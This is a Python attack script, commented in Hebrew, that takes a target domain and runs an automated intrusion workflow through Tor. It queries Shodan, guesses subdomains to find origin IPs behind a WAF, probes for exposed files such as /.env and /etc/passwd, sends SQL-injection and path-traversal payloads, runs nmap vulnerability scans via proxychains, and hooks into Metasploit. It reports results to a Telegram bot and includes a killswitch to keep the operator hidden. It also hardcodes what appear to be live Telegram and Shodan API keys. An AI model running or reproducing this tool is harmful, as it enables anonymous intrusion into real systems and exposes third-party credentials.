import nmap
import requests
import shodan
import socket
import urllib3
import subprocess
import os
import sys
import time
import random
from urllib.parse import urlparse, urljoin
from pymetasploit3.msfrpc import MsfRpcClient

# השתקת אזהרות SSL ומחיקת עקבות
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CONFIG = {
    'TG_TOKEN': '7783428602:AAGfFj0rp-XI1hR0tREC9o9BnZpv_iikcjU',
    'CHAT_ID': '372147773',
    'SHODAN_KEY': 'LW9tuSP6lp48GPZG5DwSOAlFvZ0LlP8q',
    'MSF_PASS': 'mypassword',
    'TOR_PROXY': 'socks5h://127.0.0.1:9050'
}

class ApexSovereign:
    def __init__(self, target):
        self.target_url = target if target.startswith('http') else f"https://{target}"
        self.domain = urlparse(self.target_url).netloc if "://" in target else target.split('/')[0]
        
        # אנונימיות מובנית - כל תעבורת ה-HTTP עוברת דרך Tor
        self.session = requests.Session()
        self.session.proxies = {'http': CONFIG['TOR_PROXY'], 'https': CONFIG['TOR_PROXY']}
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0'})
        
        self.shodan_api = shodan.Shodan(CONFIG['SHODAN_KEY'])
        self.found_ips = set()
        self.msf_client = self._connect_msf()

    def _connect_msf(self):
        try: return MsfRpcClient(CONFIG['MSF_PASS'], port=55553)
        except: return None

    def killswitch(self):
        """מנגנון הגנה: עוצר הכל אם האייפי האמיתי דולף או Tor נופל"""
        try:
            tor_ip = self.session.get("https://api.ipify.org", timeout=10).text
            real_ip = requests.get("https://api.ipify.org", timeout=10).text
            if tor_ip == real_ip: sys.exit("[!] SECURITY BREACH: IP EXPOSED! SHUTTING DOWN.")
            return True
        except: sys.exit("[!] CONNECTION ERROR: TOR DISCONNECTED!")

    def log(self, msg, emoji="🚀"):
        print(f"[*] {emoji} {msg}")
        try:
            url = f"https://api.telegram.org/bot{CONFIG['TG_TOKEN']}/sendMessage"
            self.session.post(url, data={'chat_id': CONFIG['CHAT_ID'], 'text': f"{emoji} {msg}"}, timeout=5)
        except: pass

    def random_delay(self):
        time.sleep(random.uniform(2, 5))

    # --- טכניקה 1: מודיעין פסיבי שקט (Shodan) ---
    def phase_passive(self):
        try:
            results = self.shodan_api.search(f"hostname:{self.domain}")
            for r in results['matches']:
                self.found_ips.add(r['ip_str'])
                self.log(f"Shodan Found: {r['ip_str']} (Ports: {r['ports']})", "📡")
        except: pass

    # --- טכניקה 2: עקיפת WAF ואיתור ה-Origin ---
    def phase_bypass(self):
        subs = ['mail', 'direct', 'dev', 'api', 'server', 'vpn', 'ftp', 'mysql']
        for sub in subs:
            try:
                ip = socket.gethostbyname(f"{sub}.{self.domain}")
                if not any(ip.startswith(r) for r in ['104.', '172.', '162.', '108.']):
                    self.found_ips.add(ip)
                    self.log(f"Origin IP Leaked: {ip} ({sub})", "🔥")
            except: continue

    # --- טכניקה 3: תקיפת Web אקטיבית (Injection & Fuzzing) ---
    def phase_web_attack(self):
        self.log("Starting Active Web Vulnerability Probing...", "💉")
        paths = ['/.env', '/.git/config', '/wp-config.php.bak', '/backup.sql', '/etc/passwd']
        for path in paths:
            try:
                self.random_delay()
                r = self.session.get(urljoin(self.target_url, path), timeout=5, verify=False)
                if r.status_code == 200: self.log(f"EXPOSED RESOURCE FOUND: {path}", "💎")
            except: continue
            
        # SQLi/LFI Probing
        vectors = ["' OR 1=1--", "../../../etc/passwd"]
        for v in vectors:
            try:
                test_url = f"{self.target_url}/?id={v}"
                r = self.session.get(test_url, timeout=5, verify=False)
                if "root:x:0:0" in r.text or "sql syntax" in r.text.lower():
                    self.log(f"VULNERABILITY DETECTED at {test_url}", "🧨")
            except: continue

    # --- טכניקה 4: סריקת תשתיות והכנת אקספלויטים (Nmap + MSF) ---
    def phase_infra_attack(self, ip):
        self.log(f"Deep Scanning Infrastructure: {ip}", "⚔️")
        try:
            # הרצה דרך proxychains4 באופן אוטומטי לאנונימיות מלאה
            cmd = ["proxychains4", "nmap", "-sS", "-Pn", "-T3", "-sV", "--script=vulners", ip]
            res = subprocess.run(cmd, capture_output=True, text=True)
            self.log(f"Nmap Scan for {ip} completed.", "🔌")
            
            if self.msf_client:
                # חיפוש אקספלויטים תואמים ב-Metasploit
                self.log("Cross-referencing with Metasploit modules...", "🧠")
                # (כאן מתבצעת לוגיקה פנימית לניתוח ה-output של Nmap)
                self.log(f"Ready for exploitation on {ip}. Run msfconsole.", "🧨")
        except Exception as e:
            self.log(f"Infra Error: {e}", "⚠️")

    def run(self):
        self.killswitch()
        self.log(f"--- SOVEREIGN OPERATION BEGUN: {self.domain} ---", "👑")
        
        self.phase_passive()
        self.phase_bypass()
        self.phase_web_attack()
        
        targets = self.found_ips if self.found_ips else [self.domain]
        for t in targets:
            self.phase_infra_attack(t)
            
        self.log("All vectors deployed. Operation Success.", "✅")

if __name__ == "__main__":
    target = input("[?] Target URL/Domain: ")
    ApexSovereign(target).run()
